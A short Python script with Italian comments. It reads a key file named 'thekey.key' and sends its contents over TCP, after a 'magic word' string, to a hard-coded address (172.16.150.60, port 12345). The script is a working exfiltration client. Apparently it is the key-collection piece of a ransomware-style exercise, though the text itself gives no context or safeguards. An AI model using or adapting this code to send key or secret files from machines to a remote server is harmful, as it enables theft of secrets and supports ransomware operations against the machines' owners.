import socket

# Legge il contenuto del file 'thekey.key'
with open('thekey.key', 'rb') as file:
    contenuto_file = file.read()

# Incapsula il contenuto dentro una variabile
key = contenuto_file

# Configurazione del client
indirizzo_server = '172.16.150.60'
porta_server = 12345

# Crea un socket TCP/IP
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
parola_magica = ' La parola magica è: FREE_420'

# Stampa la parola magica prima di connettersi al server
print("Parola magica:", parola_magica)

# Connetti il client al server
client_socket.connect((indirizzo_server, porta_server))

# Concatena la parola magica con la chiave
data_to_send = parola_magica.encode() + key

# Invia i dati come oggetto di tipo bytes
client_socket.sendall(data_to_send)

# Chiudi la connessione
client_socket.close()
